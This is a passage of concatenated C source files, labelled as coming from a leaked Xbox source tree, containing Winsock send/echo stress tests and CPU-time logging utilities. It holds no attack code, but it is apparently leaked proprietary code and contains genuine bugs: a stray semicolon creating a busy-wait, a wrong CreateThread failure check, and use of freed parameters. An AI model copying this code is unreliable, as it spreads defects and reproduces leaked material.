				pEchoClientParam->pTestParams->fUseCriticalSection ? LeaveCriticalSection(&(pEchoClientParam->SocketCriticalSection)) : 0;

				// If we are non-blocking and we would have blocked... wait for readability
				if(pEchoClientParam->pTestParams->fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
					while(!IsSocketReady(pEchoClientParam->Connection, READABLE, 10))
					{
						MyLog(pEchoClientParam->pTestParams->hLog, XLL_INFO, "Waiting for socket to become readable");
					}
					// No bytes were read, the operation was just reporting that it would have blocked
					nBytesRead = 0;
					continue;
				}

				if((WSAGetLastError() == WSAEINPROGRESS) && !pEchoClientParam->pTestParams->fUseCriticalSection)
				{
					++pEchoClientParam->dwInProgressOnRecvs;
					Sleep(500);
					continue;
				}

				MyLog(pEchoClientParam->pTestParams->hLog, XLL_FAIL, "Couldn't recv data: %u", WSAGetLastError());
				goto EXIT;				
			}

			pEchoClientParam->fInRecv = FALSE;
			++pEchoClientParam->dwTotalRecvs;

			// Unlock the socket
			pEchoClientParam->pTestParams->fUseCriticalSection ? LeaveCriticalSection(&(pEchoClientParam->SocketCriticalSection)) : 0;
		}


		dwCheckSum = CalculateCheckSum(pPacket->dwPayloadSize, (BYTE *) pPacket->bPayload);

		if(dwCheckSum != pPacket->dwPayloadChecksum)
			MyLog(pEchoClientParam->pTestParams->hLog, XLL_WARN, "Received packet %u checksum failed: %u", 
			pPacket->dwPacketNumber, dwCheckSum);

	} // Test has reached it's end-time

EXIT:

	return 0;
}

//==================================================================================
// DoMultiThreadEchoClientTest
//----------------------------------------------------------------------------------
//
// Description:  Test which establishes a connection and begins a tight send loop.
//
// Arguments:
//	LPVOID			pParam		Pointer to structure containing test parameters
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
DWORD WINAPI DoMultiThreadEchoClientTest(LPVOID pParam)
{
	ECHO_CLIENT_PARAM	EchoClientParam;
	TEST_PARAMS *pTestParams = (TEST_PARAMS *) pParam;
	SENDRECV_PACKET	*pPacket;
	HANDLE	hRecvThread = NULL, hCountThread = NULL;
	DWORD	dwStartTick, dwTotalBytesSent = 0, dwTotalPacketSize = 0, dwReturnValue = TRUE;
	BYTE	PacketBuffer[MAX_PACKET_SIZE + (4 * sizeof(DWORD))];
	INT		nBytesSent = 0;

	pPacket = (SENDRECV_PACKET *) PacketBuffer;
	pPacket->dwPacketNumber = 0;

	MyLog(pTestParams->hLog, XLL_INFO, "Running MultiThreadEchoClientTest");

	// Initialize the parameter for the recv thread
	pTestParams->fUseCriticalSection ? InitializeCriticalSection(&(EchoClientParam.SocketCriticalSection)) : 0;
	EchoClientParam.pTestParams = pTestParams;
	EchoClientParam.Connection = INVALID_SOCKET;

	// Establish the connection either by initiating one or waiting for an incoming one
	if(pTestParams->fInitiateConnection)
	{
		if(!pTestParams->szDestinationAddress)
		{
			MyLog(pTestParams->hLog, XLL_FAIL, "Cannot establish a connection without a destination address!");
			dwReturnValue = FALSE;
			goto EXIT;
		}

			EchoClientParam.Connection = EstablishConnection(pTestParams->hLog, pTestParams->szDestinationAddress, pTestParams->fNonBlocking);
	}
	else
		EchoClientParam.Connection = WaitForIncomingConnection(pTestParams->hLog, pTestParams->fNonBlocking);

	// Start counting send's from zero
	EchoClientParam.fTestActive = TRUE;
	EchoClientParam.dwInProgressOnRecvs = 0;
	EchoClientParam.dwInProgressOnSends = 0;
	EchoClientParam.dwTotalSends = 0;
	EchoClientParam.dwTotalRecvs = 0;
	EchoClientParam.fInSend = FALSE;
	EchoClientParam.fInRecv = FALSE;

	// Spawn the count thread
	if((hCountThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SendRecvCountThread, (LPVOID) &EchoClientParam, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
		MyLog(pTestParams->hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
		dwReturnValue = FALSE;
		goto EXIT;
	}

	// Spawn the recv thread
	if((hRecvThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) EchoClientRecvThread, (LPVOID) &EchoClientParam, 0, NULL)) == NULL)
	{
		MyLog(pTestParams->hLog, XLL_WARN, "Couldn't create thread: %u", GetLastError());
		dwReturnValue = FALSE;
		goto EXIT;
	}

	// Get the start time of the test
	dwStartTick = GetTickCount();

	// While the test hasn't reached it's end-time, send data
	while(!IsTimeExpired(pTestParams->dwSecondsToRun, dwStartTick))
	{
		// Create all the packet header fields and build the payload data
		pPacket->dwPacketType = SENDRECV;
		++(pPacket->dwPacketNumber);
		pPacket->dwPayloadSize = RandomRange(1, MAX_PACKET_SIZE);
		pPacket->dwPayloadChecksum = BuildTestPacket(pPacket->dwPayloadSize, (BYTE *) pPacket->bPayload);

		dwTotalPacketSize = pPacket->dwPayloadSize + (4 * sizeof(DWORD));

		// Loop until we send all the data from this packet
		for(dwTotalBytesSent = 0; dwTotalBytesSent < dwTotalPacketSize; dwTotalBytesSent += (DWORD) nBytesSent)
		{
			nBytesSent = 0;
			
			// If we are using critical sections, lock the socket
			if(pTestParams->fUseCriticalSection)
				EnterCriticalSection(&(EchoClientParam.SocketCriticalSection));
			// Otherwise, wait until the socket is marked as writable so we don't block in send for too long
			else
				while(!IsSocketReady(EchoClientParam.Connection, WRITEABLE, 10));
				{
					MyLog(pTestParams->hLog, XLL_INFO, "Waiting for socket to become writeable");
				}

			EchoClientParam.fInSend = TRUE;

			if ((nBytesSent = send(EchoClientParam.Connection, (char *) pPacket + dwTotalBytesSent, dwTotalPacketSize - dwTotalBytesSent, 0)) == SOCKET_ERROR)
			{
				EchoClientParam.fInSend = FALSE;
				
				// Unlock the socket
				pTestParams->fUseCriticalSection ? LeaveCriticalSection(&(EchoClientParam.SocketCriticalSection)) : 0;

				// If we are non-blocking and we would have blocked... wait for writeability
				if(pTestParams->fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
				{
					while(!IsSocketReady(EchoClientParam.Connection, WRITEABLE, 10))
					{
						MyLog(pTestParams->hLog, XLL_INFO, "Waiting for socket to become writeable");
					}
					// No bytes were sent, the operation was just reporting that it would have blocked
					nBytesSent = 0;
					continue;
				}

				// If another blocking operation was in progress, try again later
				if((WSAGetLastError() == WSAEINPROGRESS) && !pTestParams->fUseCriticalSection)
				{
					++EchoClientParam.dwInProgressOnSends;
					continue;
				}

				MyLog(pTestParams->hLog, XLL_FAIL, "Couldn't send data: %u", WSAGetLastError());
				dwReturnValue = FALSE;
				goto EXIT;				
			}

			EchoClientParam.fInSend = FALSE;
			++EchoClientParam.dwTotalSends;

			// Unlock the socket
			pTestParams->fUseCriticalSection ? LeaveCriticalSection(&(EchoClientParam.SocketCriticalSection)) : 0;
		}	
		
	} // Test has reached it's end-time

EXIT:

	// Signal the recv thread to end
	EchoClientParam.fTestActive = FALSE;

	// Wait for the threads to tend
	if(hRecvThread)
	{
		WaitForSingleObject(hRecvThread, INFINITE);
		MyLog(pTestParams->hLog, XLL_INFO, "RecvThread signalled completion");
		CloseHandle(hRecvThread);
		hRecvThread = INVALID_HANDLE_VALUE;
	}
	if(hCountThread)
	{
		WaitForSingleObject(hCountThread, INFINITE);
		MyLog(pTestParams->hLog, XLL_INFO, "CountThread signalled completion");
		CloseHandle(hCountThread);
		hCountThread = INVALID_HANDLE_VALUE;
	}

	// Clean up the critical section if we created it
	pTestParams->fUseCriticalSection ? DeleteCriticalSection(&(EchoClientParam.SocketCriticalSection)) : 0;

	// Clean up the test socket, we don't need it anymore
	if(EchoClientParam.Connection != INVALID_SOCKET)
	{
		closesocket(EchoClientParam.Connection);
		EchoClientParam.Connection = INVALID_SOCKET;
	}

	pTestParams->fCleanUpAfterTest ? LocalFree(pTestParams) : 0;

	if(dwReturnValue)
		MyLog(pTestParams->hLog, XLL_PASS, "MultiThreadEchoClientTest passed");
	else
		MyLog(pTestParams->hLog, XLL_FAIL, "MultiThreadEchoClientTest failed");

	return dwReturnValue;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\perf\util.h ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  util.h

Abstract:

  This module contains the definitions for util.c

Author:

  Steven Kehrli (steveke) 17-Nov-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#ifndef _UTIL_H
#define _UTIL_H

#include "precomp.h"



// Function prototypes

// Stats

VOID
GetCpuTimes(
    ULONG  *KernelTime,
    ULONG  *InterruptTime,
    ULONG  *DpcTime,
    ULONG  *IdleTime
);

VOID
CalculateStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
);

VOID
CalculateAndAddStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
);



// Logging

VOID
Log_va(
    IN  HANDLE  hLog,
    IN  BOOL    bEcho,
    IN  LPSTR   lpszFormatString,
    IN  ...
);

VOID
LogCsvHeader(
    IN  HANDLE  hLog
);

VOID
LogStats(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  DWORD   dwTestIteration,
    IN  INT     nPayload,
    IN  INT     nPayloadTotal,
    IN  INT     nOverhead,
    IN  INT     nEthernetTotal,
    IN  ULONG   KernelTimeInitial,
    IN  ULONG   KernelTimeFinal,
    IN  ULONG   InterruptTimeInitial,
    IN  ULONG   InterruptTimeFinal,
    IN  ULONG   DpcTimeInitial,
    IN  ULONG   DpcTimeFinal,
    IN  ULONG   IdleTimeInitial,
    IN  ULONG   IdleTimeFinal
);

VOID
LogStatsSummary(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  INT     nPayload,
    IN  INT     nPayloadTotal,
    IN  INT     nEthernetOverhead,
    IN  INT     nEthernetTotal,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   dwAverage
);

VOID
LogStatsCsv(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  INT     nPayload,
    IN  INT     nPayloadTotal,
    IN  INT     nEthernetOverhead,
    IN  INT     nEthernetTotal,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   dwAverage
);

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\stress\sendrecv\sendrecv.h ===
#ifndef __SENDRECV_H__
#define __SENDRECV_H__

//==================================================================================
// Includes
//==================================================================================
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#ifdef _XBOX
#include <xtl.h>
#include "xlog.h"
#else
#include <winsock.h>
#include <stdarg.h>
#include <tchar.h>
#endif


//==================================================================================
// Defines
//==================================================================================
#define	SEND_RECV_PORT		65533
#define	FIND_SERVER_PORT	65532
#define TIME_INFINITY		10000
#define	MAX_PACKET_SIZE		4096

#ifndef _XBOX
#define XLL_INFO			0
#define	XLL_WARN			0
#define XLL_FAIL			0
#define XLL_PASS			0
#endif

//==================================================================================
// Typedefs
//==================================================================================

// States that sockets can be monitored for
typedef enum _SOCKET_STATE
{
	READABLE,
	WRITEABLE,
	EXCEPTION
} SOCKET_STATE;

// Lists all the possible tests cases that are supported
typedef enum _TEST_CASE
{
	NO_TEST,
	DOWNSTREAM_DATA,
	UPSTREAM_DATA,
	UPSTREAM_DATA_DELAYED_RECV,
	ECHO,
	ECHO_DELAYED_RECV
} TEST_CASE;

// Lists all the packet types available
typedef enum _PACKET_TYPE
{
	FINDSERV,
	SERVREPLY,
	TESTREQUEST,
	TESTREPLY,
	SENDRECV,
	ENDTEST
} PACKET_TYPE;

// This structure is used to pass test params into the test case functions
typedef struct _TEST_PARAMS
{
	HANDLE hLog;
	BOOL fInitiateConnection;
	BOOL fUseDelays;
	BOOL fNonBlocking;
	BOOL fUseCriticalSection;
	BOOL fCleanUpAfterTest;
	DWORD dwSecondsToRun;
	CHAR szDestinationAddress[16];
} TEST_PARAMS;

// This structure defines a generic packet for initial casting
typedef struct _GENERIC_PACKET
{
	DWORD	dwPacketType;
} GENERIC_PACKET;

// This structure defines the simple packet used to detect sendrecv servers
typedef struct _FINDSERV_PACKET
{
	DWORD	dwPacketType;
} FINDSERV_PACKET;

// This structure defines the simple packet used to reply to client detection
typedef struct _SERVREPLY_PACKET
{
	DWORD	dwPacketType;
} SERVREPLY_PACKET;

// This structure defines the simple packet used to detect sendrecv servers
typedef struct _TESTREQEST_PACKET
{
	DWORD		dwPacketType;
	DWORD		dwTestID;
	TEST_CASE	TestRequested;
} TESTREQUEST_PACKET;

// This structure defines the simple packet used to detect sendrecv servers
typedef struct _TESTREPLY_PACKET
{
	DWORD		dwPacketType;
	DWORD		dwTestID;
	TEST_CASE	TestRequested;
} TESTREPLY_PACKET;

// This structure defines the header for the packets this test exchanges
typedef struct _SENDRECV_PACKET
{
	DWORD	dwPacketType;
	DWORD	dwPacketNumber;
	DWORD	dwPayloadSize;
	DWORD	dwPayloadChecksum;
	BYTE	bPayload[1];
} SENDRECV_PACKET;

// This structure defines the simple packet used to reply to client detection
typedef struct _ENDTEST_PACKET
{
	DWORD	dwPacketType;
} ENDTEST_PACKET;

// This structure is used to log the number of echos being sent
typedef struct _ECHO_SERVER_PARAM
{
	BOOL				fTestActive;
	BOOL				fInSend;
	BOOL				fInRecv;
	DWORD				dwTotalEchos;
	HANDLE				hLog;
} ECHO_SERVER_PARAM;

// This structure is used to share access to a socket via a critical section
typedef struct _ECHO_CLIENT_PARAM
{
	TEST_PARAMS			*pTestParams;
	BOOL				fTestActive;
	BOOL				fInSend;
	BOOL				fInRecv;
	DWORD				dwInProgressOnSends;
	DWORD				dwInProgressOnRecvs;
	DWORD				dwTotalSends;
	DWORD				dwTotalRecvs;
	SOCKET				Connection;
	CRITICAL_SECTION	SocketCriticalSection;
} ECHO_CLIENT_PARAM;


//==================================================================================
// Prototypes
//==================================================================================
SOCKET EstablishConnection(HANDLE hLog, LPCSTR szDestinationAddress, BOOL fNonBlocking);
SOCKET WaitForIncomingConnection(HANDLE hLog, BOOL fNonBlocking);
SOCKET CreateBroadcastListenerSocket(HANDLE hLog, WORD wPort);
TEST_CASE ProcessNextBroadcastPacket(HANDLE hLog, SOCKET BroadcastListener);
DWORD WINAPI EchoClientRecvThread(LPVOID *pParm);
BOOL FindServer(HANDLE hLog, CHAR *szDestinationAddress);
BOOL RequestTest(HANDLE hLog, TEST_CASE TestCase, CHAR *szDestinationAddress);

BOOL IsSocketReady(SOCKET Socket, SOCKET_STATE SocketState, DWORD dwSecondsToWait);
BOOL IsTimeExpired(DWORD dwSecondsToRun, DWORD dwStartTick);
BOOL IsServer();

DWORD WINAPI DoSendTest(LPVOID pParam);
DWORD WINAPI DoRecvTest(LPVOID pParam);
DWORD WINAPI DoSingleThreadEchoServerTest(LPVOID pParam);
DWORD WINAPI DoMultiThreadEchoClientTest(LPVOID pParam);

#ifndef _XBOX
VOID WINAPI StartTest(IN HANDLE  hLog);
VOID WINAPI EndTest();
#endif

#ifdef __cplusplus
extern "C" {
#endif
WINBASEAPI
UINT
WINAPI
GetProfileIntA(
    IN LPCSTR lpAppName,
    IN LPCSTR lpKeyName,
    IN INT nDefault
    );
WINBASEAPI
DWORD
WINAPI
GetProfileStringA(
    IN LPCSTR lpAppName,
    IN LPCSTR lpKeyName,
    IN LPCSTR lpDefault,
    OUT LPSTR lpReturnedString,
    IN DWORD nSize
    );
#ifdef __cplusplus
}
#endif

#endif // __SLDGMAIN_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\perf\util.c ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  util.c

Abstract:

  This module contains the utility functions for xnet

Author:

  Steven Kehrli (steveke) 17-Nov-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#include "precomp.h"



VOID
GetCpuTimes(
    ULONG  *KernelTime,
    ULONG  *InterruptTime,
    ULONG  *DpcTime,
    ULONG  *IdleTime
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Gets the kernel and idle time

Arguments:

  KernelTime - Kernel time
  InterruptTime - Interrupt time
  DpcTime - Dpc time
  IdleTime - Idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // pkprcb is a pointer to the processor control block
    PKPRCB  pkprcb = NULL;



    // Update the system times
    __asm {
        pushfd
        cli
    };

    pkprcb = KeGetCurrentPrcb();

    *KernelTime = pkprcb->CurrentThread->KernelTime;
    *InterruptTime = pkprcb->InterruptTime;
    *DpcTime = pkprcb->DpcTime;
    *IdleTime = pkprcb->IdleThread->KernelTime;

    __asm popfd;
}



VOID
CalculateStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the difference in each stat

Arguments:

  KernelTimeInitial - Initial kernel time
  KernelTimeFinal - Final kernel time
  InterruptTimeInitial - Initial interrupt time
  InterruptIdleFinal - Final interrupt time
  DpcTimeInitial - Initial dpc time
  DpcTimeFinal - Final dpc time
  IdleTimeInitial - Initial idle time
  IdleTimeFinal - Final idle time
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Calculate the diff
    *KernelTimeDiff = KernelTimeFinal - KernelTimeInitial;
    *InterruptTimeDiff = InterruptTimeFinal - InterruptTimeInitial;
    *DpcTimeDiff = DpcTimeFinal - DpcTimeInitial;
    *IdleTimeDiff = IdleTimeFinal - IdleTimeInitial;
}



VOID
CalculateAndAddStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the difference in each stat and adds it to the difference

Arguments:

  KernelTimeInitial - Initial kernel time
  KernelTimeFinal - Final kernel time
  InterruptTimeInitial - Initial interrupt time
  InterruptTimeFinal - Final interrupt time
  DpcTimeInitial - Initial dpc time
  DpcTimeFinal - Final dpc time
  IdleTimeInitial - Initial idle time
  IdleTimeFinal - Final idle time
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Calculate the diff
    *KernelTimeDiff += (KernelTimeFinal - KernelTimeInitial);
    *InterruptTimeDiff += (InterruptTimeFinal - InterruptTimeInitial);
    *DpcTimeDiff += (DpcTimeFinal - DpcTimeInitial);
    *IdleTimeDiff += (IdleTimeFinal - IdleTimeInitial);
}



VOID
Log_va(
    IN  HANDLE  hLog,
    IN  BOOL    bEcho,
    IN  LPSTR   lpszFormatString,
    IN  ...
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Writes the string to the log file

Arguments:

  hLog - Handle to the log object
  bEcho - Specifies if string should be echoed to the debugger
  lpszFormatString - Pointer to the format string

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // varg_ptr is a pointer to the variable argument list
    va_list  varg_ptr = NULL;
    // szLogString is the string in the line of log output
    CHAR     szLogString[1024 + 1] = {'\0'};
    // dwBytesWritten is the number of bytes written to the file
    DWORD    dwBytesWritten = 0;



    // Get the variable argument list
    va_start(varg_ptr, lpszFormatString);

    // Format the variable argument list
    _vsnprintf(szLogString, 1024, lpszFormatString, varg_ptr);

    // Write the string to the log file
    WriteFile(hLog, szLogString, strlen(szLogString), &dwBytesWritten, NULL);

    if (TRUE == bEcho) {
        // Echo the string to the debugger
        OutputDebugStringA(szLogString);
    }
}



VOID
LogCsvHeader(
    IN  HANDLE  hLog
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the csv column header banner to the log file

Arguments:

  hLog - Handle to the log object

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Write the banner to the log file
    Log_va(hLog, FALSE, "Socket Type,Payload (Bytes),Total Payload (Bytes),Overhead (Bytes),Total Ethernet (Bytes),Kernel Time (ms),Interrupt Time (ms),DPC Time (ms),Idle Time (ms),Total Time (ms),CPU Usage (%%)\r\n");
}



VOID
LogStats(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  DWORD   dwTestIteration,
    IN  INT     nPayload,
    IN  INT     nPayloadTotal,
    IN  INT     nEthernetOverhead,
    IN  INT     nEthernetTotal,
    IN  ULONG   KernelTimeInitial,
    IN  ULONG   KernelTimeFinal,
    IN  ULONG   InterruptTimeInitial,
    IN  ULONG   InterruptTimeFinal,
    IN  ULONG   DpcTimeInitial,
    IN  ULONG   DpcTimeFinal,
    IN  ULONG   IdleTimeInitial,
    IN  ULONG   IdleTimeFinal
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats to the log file

Arguments:

  hLog - Handle to the log object
  lpszBanner - Banner string
  dwTestIteration - Test iteration number
  nPayload - Payload
  nPayloadTotal - Total payload
  nEthernetOverhead - Ethernet overhead
  nEthernetTotal - Total ethernet
  KernelTimeInitial - Initial kernel time
  KernelTimeFinal - Final kernel time
  InterruptTimeInitial - Initial interrupt time
  InterruptTimeFinal - Final interrupt time
  DpcTimeInitial - Initial dpc time
  DpcTimeFinal - Final dpc time
  IdleTimeInitial - Initial idle time
  IdleTimeFinal - Final idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // KernelTimeDiff is the diff in kernel time
    ULONG   KernelTimeDiff;
    // InterruptTimeDiff is the diff in interrupt time
    ULONG   InterruptTimeDiff;
    // DpcTimeDiff is the diff in dpc time
    ULONG   DpcTimeDiff;
    // IdleTimeDiff is the diff in idle time
    ULONG   IdleTimeDiff;
    // TotalTime is the total time
    ULONG   TotalTime;
    // CPUUsage is the CPU Usage (percentage)
    DOUBLE  CPUUsage;



    // Calculate the diff
    CalculateStatsDiff(KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, &KernelTimeDiff, &InterruptTimeDiff, &DpcTimeDiff, &IdleTimeDiff);

    // Write the banner to the log file
    Log_va(hLog, TRUE, "**********\r\n%s - %d\r\n**********\r\n", lpszBanner, dwTestIteration);

    // Log the stats
    Log_va(hLog, TRUE, "Data (Bytes)\r\n");
    Log_va(hLog, TRUE, "    Payload:           %14u\r\n", nPayload);
    Log_va(hLog, TRUE, "    Total Payload:     %14u\r\n", nPayloadTotal);
    Log_va(hLog, TRUE, "    Ethernet Overhead: %14u\r\n", nEthernetOverhead);
    Log_va(hLog, TRUE, "    Total Ethernet:    %14u\r\n", nEthernetTotal);

    Log_va(hLog, TRUE, "Kernel Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", KernelTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", KernelTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", KernelTimeDiff);

    Log_va(hLog, TRUE, "Interrupt Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", InterruptTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", InterruptTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", InterruptTimeDiff);

    Log_va(hLog, TRUE, "DPC Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", DpcTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", DpcTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", DpcTimeDiff);

    Log_va(hLog, TRUE, "Idle Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", IdleTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", IdleTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", IdleTimeDiff);

    TotalTime = KernelTimeDiff + InterruptTimeDiff + DpcTimeDiff + IdleTimeDiff;

    if (0 == TotalTime) {
        CPUUsage = 0;
    }
    else {
        CPUUsage = 100 - (100 * ((DOUBLE) IdleTimeDiff / (DOUBLE) TotalTime));
    }
    Log_va(hLog, TRUE, "CPU Usage\r\n");
    Log_va(hLog, TRUE, "    Total Time (ms):   %14u\r\n", TotalTime);
    Log_va(hLog, TRUE, "    CPU Usage (%%):     %14.3f\r\n", CPUUsage);

    // End the section
    Log_va(hLog, TRUE, "**********\r\n\r\n");
}



VOID
LogStatsSummary(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  INT     nPayload,
    IN  INT     nPayloadTotal,
    IN  INT     nEthernetOverhead,
    IN  INT     nEthernetTotal,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   dwAverage
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats to the log file

Arguments:

  hLog - Handle to the log object
  lpszBanner - Banner string
  nPayload - Payload
  nPayloadTotal - Total payload
  nEthernetOverhead - Ethernet overhead
  nEthernetTotal - Total ethernet
  KernelTime - Kernel time
  InterruptTime - Interrupt time
  DpcTime - Dpc time
  IdleTime - Idle time
  dwAverage - Number to average stats

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // TotalTime is the total time
    ULONG   TotalTime;
    // CPUUsage is the CPU Usage (percentage)
    DOUBLE  CPUUsage;



    if (0 == dwAverage) {
        dwAverage = 1;
    }

    // Write the banner to the log file
    Log_va(hLog, TRUE, "**********\r\n%s\r\n**********\r\n", lpszBanner);

    // Log the stats
    Log_va(hLog, TRUE, "Payload Data (Bytes):           %14u\r\n", nPayload);
    Log_va(hLog, TRUE, "Total Payload Data (Bytes):     %14u\r\n", nPayloadTotal);
    Log_va(hLog, TRUE, "Ethernet Overhead Data (Bytes): %14u\r\n", nEthernetOverhead);
    Log_va(hLog, TRUE, "Total Ethernet Data (Bytes):    %14u\r\n", nEthernetTotal);
    Log_va(hLog, TRUE, "Kernel Time (ms):               %14.3f\r\n", ((DOUBLE) KernelTime / (DOUBLE) dwAverage));
    Log_va(hLog, TRUE, "Interrupt Time (ms):            %14.3f\r\n", ((DOUBLE) InterruptTime / (DOUBLE) dwAverage));
    Log_va(hLog, TRUE, "DPC Time (ms):                  %14.3f\r\n", ((DOUBLE) DpcTime / (DOUBLE) dwAverage));
    Log_va(hLog, TRUE, "Idle Time (ms):                 %14.3f\r\n", ((DOUBLE) IdleTime / (DOUBLE) dwAverage));

    TotalTime = KernelTime + InterruptTime + DpcTime + IdleTime;
    Log_va(hLog, TRUE, "Total Time (ms):                %14.3f\r\n", ((DOUBLE) TotalTime / (DOUBLE) dwAverage));

    if (0 == TotalTime) {
        CPUUsage = 0;
    }
    else {
        CPUUsage = 100 - (100 * ((DOUBLE) IdleTime / (DOUBLE) TotalTime));
    }
    Log_va(hLog, TRUE, "CPU Usage (%%):                  %14.3f\r\n", CPUUsage);

    // End the section
    Log_va(hLog, TRUE, "**********\r\n\r\n");
}



VOID
LogStatsCsv(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  INT     nPayload,
    IN  INT     nPayloadTotal,
    IN  INT     nEthernetOverhead,
    IN  INT     nEthernetTotal,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   dwAverage
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats to the csv log file

